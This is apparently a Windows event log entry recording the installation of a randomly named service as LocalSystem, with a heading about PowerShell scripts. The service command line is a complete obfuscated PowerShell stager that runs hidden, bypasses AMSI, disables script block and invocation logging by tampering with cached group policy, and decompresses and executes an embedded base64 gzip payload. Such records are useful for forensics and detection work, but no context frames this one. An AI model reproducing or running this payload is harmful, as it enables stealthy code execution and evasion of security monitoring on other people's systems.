PowerShell Scripts

A service was installed in the system.

Service Name:  TqcNTyVxcHEKdVMi

Service File Name:  %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c If($PSVersionTable.PSVersion.Major -lt 3){Exit}$sIx=[Ref].Assembly.GetType(((''{4''+''}''+''{''+''1}st''+''em.{6}''+''a''+''n''+''a''+''{5}''+''eme''+''nt''+''.{8''+''}{2}t{7''+''}''+''ma''+''t{9}''+''{7}n''+''.{8}ms{9}{''+''3}t{9}''+''{0''+''}s'')-f''l'',''y'',''u'',''U'',''S'',''g'',''M'',''o'',''A'',''i''));If($sIx) { $sIx.GetField(((''''+''{''+''9''+''}''+''{''+''8''+''}''+''{''+''6''+''}''+''{''+''1''+''0''+''}''+''{''+''3''+''}''+''{''+''0''+''}''+''{''+''1''+''0''+''}''+''{''+''2''+''}''+''{''+''5''+''}''+''{''+''9''+''}''+''{''+''1''+''0''+''}''+''{''+''4''+''}''+''{''+''1''+''}''+''{''+''7''+''}''+'''')-f''n'',''e'',''t'',''I'',''l'',''F'',''s'',''d'',''m'',''a'',''i''),''NonPublic,Static'').SetValue($null,$true); }$ec=((''En''+''a{3''+''}le{0}cri''+''p{1}Bl''+''oc{2''+''}Logging'')-f''S'',''t'',''k'',''b'');$mTIbT=[Ref].Assembly.GetType(((''{3}yste''+''m.{''+''5}ana''+''{2}ement''+''.''+''{4}utomat''+''ion.''+''{0}ti{1}s'')-f''U'',''l'',''g'',''S'',''A'',''M''));$gr9=[Collections.Generic.Dictionary[string,System.Object]]::new();$e7PL_=((''Ena{3}l''+''{5}''+''{2}cr''+''ipt{0}l''+''ockIn{4}oc''+''at''+''i''+''on{1}ogging'')-f''B'',''L'',''S'',''b'',''v'',''e'');$f_uRv=$mTIbT.GetField(''cachedGroupPolicySettings'',''NonPublic,Static'');If($f_uRv) { $bXHB=$f_uRv.GetValue($null); }$mmvA=((''S''+''cri''+''p{0}B{2}oc{1}Log''+''gin''+''g'')-f''t'',''k'',''l'');If($f_uRv) { $gr9.Add($ec,0); }If($f_uRv) { $gr9.Add($e7PL_,0); }If($f_uRv) { $bXHB[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$mmvA]=$gr9; }If($f_uRv -And $bXHB[$mmvA]) { $bXHB[$mmvA][$e7PL_]=0; }If($f_uRv -And $bXHB[$mmvA]) { $bXHB[$mmvA][$ec]=0; }If(!$f_uRv) { [Ref].Assembly.GetType(((''S{1}stem''+''.{5}a''+''na{''+''4}ement.{2''+''}utoma''+''tion.''+''Sc{3''+''}ip''+''t{0}lock'')-f''B'',''y'',''A'',''r'',''g'',''M'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); };&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIAMje8GgCA7VWbW/''+''a{0}BD+Xqn/waqQbKsEm5em{0}aRKtzYh0ARi4gAB''+''ik6Lvd''+''gb1l5ir0Poy3+/WYNDek3ucifVEsm+zMzOPvPMzC6y2BOUx0oYzEfKt7dvlN3n4ARHilaK5wE/LCulJNL3m6VFp3HYVj4p2h{0}tVk0eYRrPTk7sLElILLbzyhkRKE1JNGeUpJqufFdGIUnIweX8lnhC+aaU/qycMT7HbCe2sbEXEuUAxb7cu+Aelq5V3BWjQlO/fFH16UF1Vjm9yzBLNdXdpIJEFZ8''+''xVVd+6PLA682KaGqXeglP+UJURj{0}u1yqDOMUL0gNr96RLRMj9VIXb7O+TEJEl8e5a0s5W{0}lNh6CTcQ76fkDRVy8pUnjCdzf7''+''Qprvjr7JY0IhUOrEgCV+5JLmnHkkrbRz7jFyRxQy0XJHQOJjpOojd8yUBXDPGysp/MaP1yLoA77VK2lM''+''lkHJEopchqs9dtMv9jJGtqvqMp1sq6PBt6QAI/pAgLgoKkT5/hkH7heK''+''b5jsEXNYcntJc95NilpUunI0FTzYwLV0nGdFnj4ArpTDLjsqvtVYtVEFxgYewMh1y6s/2+j8RoM{0}vJ4EUepnOTbKgMWluYhxRr2Cs9lxQyIKRHJFKIdYDBzV1t0H8JmEkwEKiLLnxi9ppRMWjrpVR5pMEeRDYFLyCmOs/O7MNnKZ24i6JAL3tHMgKN2cpKaR3ubEpTpdzEFJthtO0rDgZJKpXVlyCGfHLCopTuttCmeD5UN27282YoB5ORWFupv8Nzt2xNo9TkWQexBUguHZXxKOY{0}UTK{0}pv6xNq4NCiOV5/Fw8aMQfqApXuIB6xIHFwh2ZKApzkz9IpLRCdaM''+''RKBTF44WgwHUCZ2{0}ZLTCwfEV19wtEiFLe8lMgUkT9yEcLuMi7IypImAMrRFefi/nPi1/uTe2AnZ''+''RUcrUmxqbYR''+''MgpLn{0}pLuEMrx{0}ARg0Up4ZOGUHDa2hUZ7Z1x{0}B8E3brZd{0}oZLWu2''+''s4deF34DWO7y7OHKEyaOuZ6fOWesI0XWw9o56yPM/++TYBbn+sCFsB7X71LQaoWeZ13JcDQLkX164VtgPPWY6p9FFr5Na1du2IW1tbXiNRvvGRPV647JuLgG8Megtkd+L6PrhAsaetGGBntlhp5/tq/mo1pqMWNtot''+''MLFiKfu4bhpGMaxj5vdDUIW9+vdz''+''U31il+3vchqxNw4thtLdIqQHZ8OWxY/H1sJcowhDlZ8fR5GURTYyGp5lEz6g5bV77csNDi7vWseG4FxPLrBoTUa1uhkdXMVwry1bvfPDbPR8clXPlkDcGcc4eAKZAK75oULkGm+R9b7Hk9reGlxZIFMa3KHzsLxquUw2L8e1Dgast4NRheTTcswqmOngdomH50FqA/iOL''+''D6GKX3za9Nozr0uT/60BsvjOEN+2g07b4T3sg7G6tI/l23m+fepLr2Lj82LPPOjmjE5jXfOB4cWfH6PHDuA78/+nj10NvM4dyBYQzfAV2mAxqLem1WCse3sqi+fVNKR08481LH6OIkDTEDLkEnKFK6xZPWrrg7nEoNTcvfCUu{0}xIRBZ4XeW2QCYox7srnINgB9bdttZPMbdHK''+''XnhvpyqOgvm85xdLJyQ{0}chNzy3MoFiQMRls2HumlCqzAfzEaeQq+/mM1XGw1MlWWrAV{0}2dlluF0zRha''+''Jpvx8meE4IKGsvAvU{0}''+''ZnD0EooQVMVtZZDIWZyzp7jll3pkwB40QKsKd57KV4QkBigfkDulJG{0}Lfdqy{0}3dW8AH9XrrsylsI//x/oct+7R92X0Uhsyyx+WXx54UnfeE33n+EqQBJF8o0I9uXw7Mw7BLk{0}XTz4EAGLHaffFJfZuK''+''gBw+0vFH8BfQ43E/''+''NCwAA'')-f''S'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"

Service Type:  user mode service

Service Start Type:  demand start

Service Account:  LocalSystem
